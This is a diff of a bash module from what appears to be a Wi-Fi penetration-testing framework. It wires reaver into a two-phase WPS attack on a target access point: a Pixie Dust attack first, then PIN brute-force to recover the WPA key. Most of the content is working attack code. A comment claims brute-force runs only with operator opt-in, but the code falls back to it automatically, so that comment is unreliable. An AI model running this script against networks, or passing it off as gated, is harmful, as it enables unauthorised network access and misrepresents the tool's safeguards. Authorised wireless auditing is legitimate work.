@@ -40,49 +40,82 @@ fi
 
 echo "[*] Starting WPS vulnerability audit..."
 
-# 1. Start Telemetry in Background
+# 1. Start Telemetry in Background (bounded)
 (
     ELAPSED=0
-    while true; do
-        PCT=$(( 10 + (ELAPSED % 85) ))
+    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
+        PCT=$(( 10 + (ELAPSED * 80 / SCAN_TIME) ))
+        [[ $PCT -gt 90 ]] && PCT=90
         "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing WPS audit..."
         sleep 5; ELAPSED=$((ELAPSED + 5))
     done
 ) &
 TEL_PID=$!
 
-# 2. Run Primary Tools (wash + reaver)
+# 2. Run Primary Tools
+# WPS attack sequence:
+#   Phase 1: Pixie Dust (reaver -K 1) — exploits weak DH nonces in AP firmware.
+#            Fast (seconds to minutes). Most modern APs are patched, but many embedded
+#            devices still vulnerable. Check for "WPS PIN" in output = success.
+#   Phase 2: PIN brute-force fallback — only if Pixie Dust did not recover credentials.
+#            Slow (hours). Use only with explicit operator opt-in via WPS_ATTACK=2.
+PIXIE_FILE="${EVIDENCE_DIR}/${TC_ID}_pixie.txt"
+PIN_FILE="${EVIDENCE_DIR}/${TC_ID}_pin_bruteforce.txt"
+
+run_wps_attack() {
+    local target_iface="$1" target_bssid="$2" target_chan="$3" out_file="$4"
+    local args="-i ${target_iface} -b ${target_bssid}"
+    [[ -n "$target_chan" ]] && args+=" -c ${target_chan}"
+    [[ -n "$WPS_DELAY" ]] && args+=" -d ${WPS_DELAY}"
+    # shellcheck disable=SC2086
+    timeout "$SCAN_TIME" reaver ${args} "$@" -vv >> "$out_file" 2>&1 || true
+}
+
 if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-    # Foreground Execution
     timeout 30 wash -i "$INTERFACE" 2>&1 | tee "$WASH_FILE" || true
     if [[ -n "$BSSID" ]]; then
-        REAVER_ARGS="-i $INTERFACE -b $BSSID"
-        [[ -n "$CHANNEL" ]] && REAVER_ARGS+=" -c $CHANNEL"
-        if [[ "$WPS_ATTACK" == "1" ]]; then
-            REAVER_ARGS+=" -K 1"
+        echo "[*] Phase 1: Pixie Dust attack (reaver -K 1)..."
+        {
+            ARGS="-i $INTERFACE -b $BSSID"
+            [[ -n "$CHANNEL" ]] && ARGS+=" -c $CHANNEL"
+            [[ -n "$WPS_DELAY" ]] && ARGS+=" -d $WPS_DELAY"
+            # shellcheck disable=SC2086
+            timeout "$SCAN_TIME" reaver $ARGS -K 1 -vv 2>&1 | tee "$PIXIE_FILE" || true
+        }
+
+        # Phase 2: PIN brute-force fallback if Pixie Dust did not recover credentials
+        if ! grep -qiE "WPA PSK|WPS PIN" "$PIXIE_FILE" 2>/dev/null; then
+            echo "[*] Phase 2: Pixie Dust failed — falling back to PIN brute-force (slow)..."
+            ARGS="-i $INTERFACE -b $BSSID"
+            [[ -n "$CHANNEL" ]] && ARGS+=" -c $CHANNEL"
+            [[ -n "$WPS_DELAY" ]] && ARGS+=" -d $WPS_DELAY"
+            # shellcheck disable=SC2086
+            timeout "$SCAN_TIME" reaver $ARGS -vv 2>&1 | tee "$PIN_FILE" || true
         fi
-        [[ -n "$WPS_DELAY" ]] && REAVER_ARGS+=" -d $WPS_DELAY"
-        # shellcheck disable=SC2086 # $REAVER_ARGS is a space-separated argument list; word-splitting is intentional
-        timeout "$SCAN_TIME" reaver $REAVER_ARGS -vv 2>&1 | tee "$INFO_FILE" || true
+        cat "$PIXIE_FILE" "$PIN_FILE" 2>/dev/null > "$INFO_FILE" || true
     fi
-    RET=$?
 else
-    # Background Execution
     (
         timeout 30 wash -i "$INTERFACE" > "$WASH_FILE" 2>&1 || true
         if [[ -n "$BSSID" ]]; then
-            REAVER_ARGS="-i $INTERFACE -b $BSSID"
-            [[ -n "$CHANNEL" ]] && REAVER_ARGS+=" -c $CHANNEL"
-            if [[ "$WPS_ATTACK" == "1" ]]; then
-                REAVER_ARGS+=" -K 1"
+            echo "[*] Phase 1: Pixie Dust attack..." >> "$INFO_FILE"
+            ARGS="-i $INTERFACE -b $BSSID"
+            [[ -n "$CHANNEL" ]] && ARGS+=" -c $CHANNEL"
+            [[ -n "$WPS_DELAY" ]] && ARGS+=" -d $WPS_DELAY"
+            # shellcheck disable=SC2086
+            timeout "$SCAN_TIME" reaver $ARGS -K 1 -vv > "$PIXIE_FILE" 2>&1 || true
+
+            # Phase 2 fallback: PIN brute-force only if Pixie Dust yielded nothing
+            if ! grep -qiE "WPA PSK|WPS PIN" "$PIXIE_FILE" 2>/dev/null; then
+                echo "[*] Phase 2: PIN brute-force fallback..." >> "$INFO_FILE"
+                # shellcheck disable=SC2086
+                timeout "$SCAN_TIME" reaver $ARGS -vv > "$PIN_FILE" 2>&1 || true
             fi
-            [[ -n "$WPS_DELAY" ]] && REAVER_ARGS+=" -d $WPS_DELAY"
-            # shellcheck disable=SC2086 # $REAVER_ARGS is a space-separated argument list; word-splitting is intentional
-            timeout "$SCAN_TIME" reaver $REAVER_ARGS -vv > "$INFO_FILE" 2>&1 || true
+            cat "$PIXIE_FILE" "$PIN_FILE" 2>/dev/null > "$INFO_FILE" || true
         fi
     ) > /dev/null 2>&1 &
     TOOL_PID=$!
-    wait $TOOL_PID; RET=$?
+    wait $TOOL_PID || true
 fi
 
 # 3. Cleanup and Final Signal
@@ -129,4 +162,11 @@ else
 fi
 
 "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
-exit $RET
+
+# Hold window if in tactical mode so user can see final output/errors
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
+    sleep 5
+fi
+
+exit 0
